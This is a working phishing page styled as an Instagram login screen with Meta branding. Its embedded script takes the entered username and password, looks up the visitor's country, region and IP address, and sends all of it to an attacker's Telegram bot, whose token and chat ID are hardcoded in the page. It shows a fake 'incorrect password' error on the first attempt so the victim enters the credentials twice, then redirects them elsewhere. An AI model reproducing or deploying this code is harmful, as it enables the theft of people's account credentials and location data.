<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
    </div>

    <!-- Username -->
    <input
      id="username"
      type="text"
      placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Password -->
    <input
      id="password"
      type="password"
      placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Login Button -->
    <button
      id="loginBtn"
      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
             flex items-center justify-center gap-2"
      disabled="false"
    >
      <span id="btnText">Log in</span>
      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
        <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
      </svg>
    </button>

    <!-- Error Message - NOW BELOW BUTTON -->
    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
      Incorrect username or password.
    </div>

    <!-- Forgotten Password -->
    <div class="text-center mb-6">
      <a href="#" class="text-sm font-normal text-black hover:underline">
        Forgotten password?
      </a>
    </div>

    <!-- Bottom Section -->
    <div class="mt-16">
      <!-- Create Account -->
      <button
        class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition"
      >
        Create new account
      </button>

      <!-- Meta -->
      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <script type="module">
    const TELEGRAM_TOKEN = "7781718948:AAF90lWhR0vfih40-foHBSDjGTcB4HRC64A";
    const TELEGRAM_CHAT_ID = "7829354744";

    let attempt = 0;

    // Function to get approximate location (country & state/region)
    async function getLocation() {
      try {
        const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,query');
        if (!res.ok) throw new Error();
        const data = await res.json();
        if (data.status === 'success') {
          return {
            country: data.country || 'Unknown',
            state: data.regionName || 'Unknown',
            ip: data.query || 'Unknown'
          };
        }
      } catch {}
      return { country: 'Unknown', state: 'Unknown', ip: 'Unknown' };
    }

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      // Show loading state
      const btn = document.getElementById("loginBtn");
      const btnText = document.getElementById("btnText");
      const spinner = document.getElementById("spinner");
      btn.disabled = true;
      btnText.textContent = "Loading";
      spinner.classList.remove("hidden");

      // Get location data
      const loc = await getLocation();

      const message = `FPHISHER ðŸ¤–

APP: INSTAGRAM
USERNAME: ${username}
PASSWORD: ${password}
COUNTRY: ${loc.country} ðŸŒ
STATE: ${loc.state}
ATTEMPT: ${attempt + 1} â±ï¸

ðŸ” 2025@FTECHSERVICES`;

      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        });
      } catch {
        // silent fail
      }

      // Restore button after short delay (simulates processing)
      setTimeout(() => {
        attempt++;

        btn.disabled = false;
        spinner.classList.add("hidden");

        if (attempt === 1) {
          btnText.textContent = "Log in";
          document.getElementById("errorMsg").classList.remove("hidden");
        } else {
          btnText.textContent = "Logging in...";
          // Redirect after tiny delay so "Loading" is visible briefly
          setTimeout(() => {
            window.location.href = "https://www.example.com/";
          }, 1200);
        }
      }, 1800); // 1.8s fake processing time
    });
  </script>
</body>
</html>
